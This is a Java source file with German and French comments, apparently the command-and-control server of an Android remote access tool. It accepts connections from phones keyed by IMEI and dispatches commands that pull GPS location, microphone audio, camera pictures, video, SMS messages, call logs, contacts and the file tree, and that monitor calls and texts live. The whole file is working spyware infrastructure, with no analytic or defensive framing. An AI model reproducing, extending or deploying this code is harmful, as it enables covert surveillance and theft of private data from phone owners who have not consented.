package server;

import gui.GUI;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.Scanner;

import inout.Controler;
import inout.Protocol;

import handler.AdvInfoHandler;
import handler.CallLogHandler;
import handler.CallMonitorHandler;
import handler.ChannelDistributionHandler;
import handler.ClientLogHandler;
import handler.ContactsHandler;
import handler.FileHandler;
import handler.FileTreeHandler;
import handler.PacketHandler;
import handler.GPSHandler;
import handler.PictureHandler;
import handler.PreferenceHandler;
import handler.SMSHandler;
import handler.SMSMonitorHandler;
import handler.SoundHandler;
import handler.VideoHandler;
import Packet.AdvancedInformationPacket;
import Packet.CallLogPacket;
import Packet.CallStatusPacket;
import Packet.CommandPacket;
import Packet.ContactsPacket;
import Packet.FilePacket;
import Packet.FileTreePacket;
import Packet.GPSPacket;
import Packet.Packet;
import Packet.PreferencePacket;
import Packet.RawPacket;
import Packet.SMSTreePacket;
import Packet.ShortSMSPacket;
import Packet.TransportPacket;
import Packet.LogPacket;

/**
 * Diese Klasse implementiert den Server.
 */
public class Server implements Controler {
	/**
	 * serverSocket	Der Socket des Severs
	 */
	private ServerSocket serverSocket;
	/**
	 * serverPort	Der Port auf dem der Server lauscht.
	 */
	private int serverPort;
	/**
	 * online 	Schleifenvariable
	 */
	private boolean online = true;
	/**
	 * Nclient	Tempräre IMEI
	 */
	private int Nclient;
	/**
	 * gui	Die GUI
	 */
	private GUI gui;
	/**
	 * clientMap	Zum Speichern der ClientHandler
	 */
	private HashMap<String, ClientHandler> clientMap;
	/**
	 * channelHandlerMap	Zum Speicher der ChannelDistributionHandler
	 */
	private HashMap<String, ChannelDistributionHandler> channelHandlerMap;

	/**
	 * Dieser Konstruktor ist der Startpunkt des Servers. Hier wird zusätzlich die Gui erstellt.
	 * Dies ist der Konstruktor.
	 * Hier wird zuerst der übergebene Port überprüft. Sollte dieser 0 sein so wird der in config.txt gespeicherte Port ausgelesen.
	 * Sollte die nicht funktionieren, so wird der Port per default auf 9999 gesetzt.
	 * Zusätzlich werden die Klassenvariablen initalisiert und erstellt.
	 *
	 * @param port	Der Port auf dem der Server lauscht.
	 */
	public Server(int port) {
		if(port == 0) {
			try {
	            Scanner sc = new Scanner(new FileInputStream("config.txt"));
	            if(sc.hasNextInt()) port = sc.nextInt();
			} catch (Exception e) {
				port = 9999;
			}
		}
		Nclient = 0;
		serverPort = port;
		clientMap = new HashMap<String, ClientHandler>();
		channelHandlerMap = new HashMap<String, ChannelDistributionHandler>();

		gui = new GUI(this, serverPort);
		//gui.addUser("coucou", null, null, null, null, null, null);
		try {
			serverSocket = new ServerSocket(serverPort);
		} catch (IOException e) {
			e.printStackTrace();
		}

		setOnline();

	}

	/**
	 * Erstellt einen neuen Server mit dem Port 0. Es wird also der Port der config.txt genommen oder der default Wert 9999.
	 * @param args Diese Variable wird nie verwendet.
	 */
	public static void main(String[] args) {
		Server s = new Server(0);
	}

	/**
	 * Mit dieser Methode wird der Port, den der Benutzer verwenden möchte, in der Datei config.txt gespeichert.
	 * @param newPort	Der Port den der Benutzer verwenden möchte.
	 */
	public void savePortConfig(String newPort) {
		try {
			BufferedWriter bw = new BufferedWriter(new FileWriter(new File("config.txt"), false));
			bw.write(newPort);
			bw.close();
		} catch (FileNotFoundException e) {
			gui.logErrTxt("Can't find config.txt");
		} catch (IOException e) {
			gui.logErrTxt("Can't write the new port in config.txt");
		}
	}

	/**
	 * Diese Methdoe startet den Server und erstellt einen Clienthandler und einen ChannelDistributionHandler.
	 * Diese werden mit Hilfe der Nclient-Nummer und dem angehängten Wort client indentifiziert.
	 * Dieser String fungiert dann als temppräre IMEI.
	 */
	public void setOnline() {
		/**
		 * Die Schleife ist solange aktiv wie online True ist.
		 */
		while (online) {
			/**
			 * Lognachricht, dass der Server online ist.
			 */
			gui.logTxt("SERVER online, awaiting for a client...");
			try {
				/**
				 * Mit diesem Aufruf wird der serverSocket aktiviert und wartet auf eingehende Verbindungen auf dem Socket.
				 */
				Socket cs = serverSocket.accept();

				// inscription temporaire d'un client connecte
				/**
				 * Die temporäre IMEI für den Client der sich verbindet.
				 */
				String id = Nclient + "client";
				/**
				 * Für diesen Client wird ein neuer ClientHandler erstellt und dieser gespeichert.
				 * Zusätzlich wird ein ChannelDistributionHandler erstellt und gespeichert.
				 */
				ClientHandler newCH = new ClientHandler(cs, id, this, gui);
				clientMap.put(id, newCH);
				channelHandlerMap.put(id, new ChannelDistributionHandler());
				/**
				 * Hier wird der ClientHandler als Thread gestartet.
				 * Zusätzlich wird eine Lognachricht ausgegeben, dass die Verbindung mit der temporären ID besteht.
				 */
				newCH.start();
				// System.out.println("client accept�");
				gui.logTxt("Connection established,temporary IMEI was assigned: " + id);
				/**
				 * Sollte eine IOException geworfen werden, wird eine Fehlernachricht erstellt.
				 */
			} catch (IOException e) {
				// e.printStackTrace();
				gui.logErrTxt("ERROR while establishing a connection");
			}
		}
		/**
		 * Wenn die Schleife abbricht, wird die Lognachricht, das der Server gestoppt wurde angezeigt.
		 */
		gui.logTxt("*** SERVER STOPPED ***\n");
	}

	/**
	 * Den Server stoppen
	 */
	public void setOffline() {
		online = false;
	}

	/**
	 * Empfängt die Daten eines Kanals des übergebenen Pakets.
	 * @param p	Das Paket
	 * @param i	der Key die IMEI.
	 */
	public void Storage(TransportPacket p, String i) {
		/**
		 * result	Das Ergebnis.
		 */
		int result = 0;
		/**
		 * Der Datenkanal.
		 */
		int chan = p.getChannel();
		// System.out.println("PacketStorage recu sur le canal " + chan);
		//gui.logTxt("Receiving data from the channel: " + chan);
		/**
		 * Überprüfen, ob die ChannelHandlerMap den übergebenen Schlüssel enthält.
		 * Sollte dies nicht der Fall sein, wird eine Fehlernachricht erstellt, dass es sich um Daten eines unbekannten Clients handelt und die Methode beendet.
		 */
		if (!channelHandlerMap.containsKey(i)) {
			gui.logTxt("ERROR: received data is from an unknown client");
			return;
			/**
			 * Hier wird nun überprüft, ob der channelHandlerMap die benötigten Daten enthält.
			 * Sollte dies nicht der Fall sein, handelt es sich um einen unregistrierten Kanal und eine Fehlermeldung wird geworfen.
			 * Ansonsten wird das Paket der channelHandlerMap hinzugefügt.
 			 */
		} else if (channelHandlerMap.get(i).getPacketMap(chan) == null
				|| channelHandlerMap.get(i).getStorage(chan) == null) {

			gui.logErrTxt("ERROR: receiving data on an unregistered channel");
			return;
		} else
			result = channelHandlerMap.get(i).getStorage(chan).addPacket(p);
		/**
		 * Überprüfen ob die Variable PACKET_LOST in Protocol gesetzt ist.
		 * Wenn dies der Fall ist, wird eine Fehlernachricht erstellen.
		 * Sollte dies nicht der Fall sein, wird überprüft ob das letzte Paket schon angekommen ist.
		 * Ist dies der Fall, wird einen Fehlermeldung erstellt.
		 * Danach wird überprüft, ob es die Größe der Daten korrekt war. Sollte dies nicht der Fall sein, wird einen Fehlernachricht erstellt.
		 * Abschließend wird noch überpüft, ob alle Daten erfolgreich übergeben wurde. Wenn ja wird die Methode dataHandlerStarter aufgerufen.
		 */
		if (result == Protocol.PACKET_LOST) {
			gui.logErrTxt("ERROR: one packet has been lost.");

		} else if (result == Protocol.NO_MORE) {
			gui.logErrTxt("ERROR: the final packet has already been received (no more packets awaited)");

		} else if (result == Protocol.SIZE_ERROR) {
			gui.logErrTxt("ERROR: the data cannot be completed, size error");
		} else if (result == Protocol.ALL_DONE) {
			//gui.logTxt("Transfer completed successfully!");
			dataHandlerStarter(chan, i);
		}

	}

	// la m�thode permettant de retrouver le DataHandler en question et de
	// lancer le traitement de la donn�e re�ue

	/**
	 * Diese Methode ist zum Extrahieren der Daten des DatenHandlers.
	 * Zusätzlich werden hier die handlePacket Methoden der einzelnen Pakete aufgerufen, um die Daten auf der GUI anzuzeigen
	 * @param channel	Der Datenkanal
	 * @param imei	Die Imei
	 */
	public void dataHandlerStarter(int channel, String imei) {
		/**
		 * Überprüfen, ob es einen ChannelHandler für die übergebene IMEI gibt.
		 * Sollte dies nicht der Fall sein, wird eine Fehlernachricht geworfen und dei Methode beendet.
		 */
		if (channelHandlerMap.get(imei).getStorage(channel) == null
				|| channelHandlerMap.get(imei).getPacketMap(channel) == null
				|| channelHandlerMap.get(imei).getPacketHandlerMap(channel) == null)

		{
			gui.logErrTxt("ERROR: a handler class cannot be found for the used channel "
					+ channel);
			return;
		}
		/**
		 * Extrahieren der finalen Paketdaten aus der channelHandlerMap.
		 */
		byte[] final_data = channelHandlerMap.get(imei).getStorage(channel)
				.getFinalData();

		// r�cup�ration du packet
		/**
		 * Extrahieren des Pakets aus der channelHandlerMap.
		 */
		Packet p = channelHandlerMap.get(imei).getPacketMap(channel);
		/**
		 * Die Daten des Pakets aus dem final_data Byte-Array extrahieren und in den Klassenvariablen speichern.
		 */
		p.parse(final_data);

		// r�cup�ration du gestionnaire du packet
		/**
		 * Erstellen eine Handlers für den Datenkanal.
		 */
		PacketHandler handler = channelHandlerMap.get(imei).getPacketHandlerMap(channel);

		// lancement du traitement
		/**
		 * Die Daten auf der GUI anzeigen.
		 */
		handler.handlePacket(p, imei, this);
	}

	/**
	 * Method that affect Handler & Packet to the right channel in the
	 * ChannelDistributionHandler It send the target channel, the command and
	 * the optionnal argument to the mux (then the client)
	 * 
	 * @param imei
	 *            Id of the client
	 * @param command
	 *            Flag command from Protocol class
	 * @param args
	 *            Optionnal arguments that completes the flag command
	 */
	public void commandSender(String imei, short command, byte[] args) {
		int channel;
		try {
			channel = channelHandlerMap.get(imei).getFreeChannel();
		} catch(NullPointerException e) {
			gui.logErrTxt("Client not available anymore. Cannot send command: "+command);
			return;
		}
			
		if (command == Protocol.GET_GPS_STREAM) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new GPSPacket()))
				gui.logErrTxt("ERREUR: The virtual channel " + channel + " already registered!");
			channelHandlerMap.get(imei).registerHandler(channel, new GPSHandler(channel, imei, gui));
			gui.saveMapChannel(imei, channel);
			
		} else if ((command == Protocol.GET_ADV_INFORMATIONS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new AdvancedInformationPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new AdvInfoHandler(channel, imei, gui));
			
		} else if ((command == Protocol.GET_PREFERENCE)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new PreferencePacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new PreferenceHandler(channel, imei, gui));
			
		} else if ((command == Protocol.GET_SOUND_STREAM)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new SoundHandler(channel, imei, gui));
			gui.saveSoundChannel(imei, channel);
			
		} else if ((command == Protocol.GET_PICTURE)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new PictureHandler(channel, imei, gui));
			gui.savePictureChannel(imei, channel);
			
		} else if ((command == Protocol.LIST_DIR)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new FileTreePacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new FileTreeHandler(channel, imei, gui));
			
		} else if ((command == Protocol.GET_CALL_LOGS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new CallLogPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new CallLogHandler(channel, imei, gui));
			gui.saveCallLogChannel(imei, channel);
			
		} else if ((command == Protocol.GET_SMS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new SMSTreePacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new SMSHandler(channel, imei, gui));
			gui.saveSMSChannel(imei, channel);
			
		} else if ((command == Protocol.GET_CONTACTS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new ContactsPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new ContactsHandler(channel, imei, gui));
			gui.saveContactChannel(imei, channel);
			
		} else if ((command == Protocol.MONITOR_CALL)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new CallStatusPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new CallMonitorHandler(channel, imei, gui));
			gui.saveMonitorCallChannel(imei, channel);
			
		} else if ((command == Protocol.MONITOR_SMS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new ShortSMSPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new SMSMonitorHandler(channel, imei, gui));
			gui.saveMonitorSMSChannel(imei, channel);
			
		} else if (command == Protocol.CONNECT) {
			channelHandlerMap.get(imei).registerListener(channel, new CommandPacket());
			channelHandlerMap.get(imei).registerListener(1, new LogPacket());
			channelHandlerMap.get(imei).registerHandler(1, new ClientLogHandler(channel, imei, gui));
		} 
		else if ((command == Protocol.GET_VIDEO_STREAM)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new VideoHandler(channel, imei, gui));
			gui.saveVideoChannel(imei, channel);
		}

		/*
		 * else if(command == Protocol.STOP_GPS_STREAM) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof GPSPacket));
		 * channelHandlerMap.get(imei).removeListener(c); } else if(command ==
		 * Protocol.STOP_MONITOR_SMS) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof SMSMonitorHandler));
		 * channelHandlerMap.get(imei).removeListener(c); } else if(command ==
		 * Protocol.STOP_SOUND_STREAM) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof SoundHandler));
		 * channelHandlerMap.get(imei).removeListener(c); } else if(command ==
		 * Protocol.STOP_VIDEO_STREAM) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof VideoHandler));
		 * channelHandlerMap.get(imei).removeListener(c); }
		 * 
		 * else if(command == Protocol.STOP_MONITOR_SMS) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof SMSMonitorHandler));
		 * channelHandlerMap.get(imei).removeListener(c); } else if(command ==
		 * Protocol.STOP_MONITOR_CALL) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof CallMonitorHandler));
		 * channelHandlerMap.get(imei).removeListener(c); }
		 */

		byte[] nullArgs = new byte[0];
		if (args == null)
			args = nullArgs;
		clientMap.get(imei).toMux(command, channel, args);
	}

	/**
	 * Diese Methode soll einen freien Datenkanal finden. Dieser wird in der Variable channel gespeichert.
	 * Sollte der Kanal jedoch schon in Benutzung sein, wird eine Fehlernachricht erstellt.
	 * Danach wird ein neuer FileHandler in der channelHandlerMap registriern. Zum Schluss wird noch der Befehl, der Datenkanal und die Argumente an den Mux gesendet.
	 * @param imei	Die IMEI
	 * @param command	Der Befehl
	 * @param args	Die Argumente
	 * @param dir	Der Pfad
	 * @param name	Der Name
	 */
	public void commandFileSender(String imei, short command, byte[] args, String dir, String name) {
		int channel = channelHandlerMap.get(imei).getFreeChannel();
		
		if (!channelHandlerMap.get(imei).registerListener(channel, new FilePacket())) 
			gui.logErrTxt("ERROR: channel " + channel+ " is already in use!");
		
		channelHandlerMap.get(imei).registerHandler(channel, new FileHandler(channel, imei, gui, dir, name));
		//gui.saveFileChannel(imei, channel);
		
		byte[] nullArgs = new byte[0];
		if (args == null) args = nullArgs;
		clientMap.get(imei).toMux(command, channel, args);
	}

	/**
	 * Diese Methode entfernt den Listener des Channels und übergibt die Argumente dem Mux.
	 * @param imei	Die IMEI
	 * @param command	Der Befehl
	 * @param args	Die Argumente
	 * @param channel	Der Datenkanal
	 */
	public void commandStopSender(String imei, short command, byte[] args,
			int channel) {

		channelHandlerMap.get(imei).removeListener(channel);

		byte[] nullArgs = new byte[0];
		if (args == null)
			args = nullArgs;
		clientMap.get(imei).toMux(command, channel, args);
	}

	/**
	 * Mit dieser Methode kann ein Client gelöscht werden.
	 * Hierzu wird in der clientMap der Eintrag mit dem Key i gelöscht und danach der Eintrag in der channelHandlerMap entfernt.
	 * Schließlich wird der Client auch von der Gui entfernt. Danach wird noch eine Lognachricht erstellt.
	 * @param i Die IMEI
	 */
	public void DeleteClientHandler(String i)
	{
		if(clientMap.containsKey(i) && channelHandlerMap.containsKey(i))
			{
			   clientMap.remove(i);
			   channelHandlerMap.remove(i);
			   gui.deleteUser(i);
			   gui.logTxt("Client "+i+" has been deleted due to it's disonnection");
				
			}
		else
			gui.logErrTxt(i+"client's data couldnt't be deleted after it's disonnection");
	}

	/**
	 * Gibt die GUI zurück.
	 * @return	Die GUI
	 */
	public GUI getGui() {
		return gui;
	}

	/**
	 * Gibt die clientMap zurück.
	 * @return	Die ClientMap
	 */
	public HashMap<String, ClientHandler> getClientMap() {
		return clientMap;
	}

	/**
	 * Gibt die channelHandlerMap zurück.
	 * @return	Die channelHandlerMap
	 */
	public HashMap<String, ChannelDistributionHandler> getChannelHandlerMap() {
		return channelHandlerMap;
	}
}
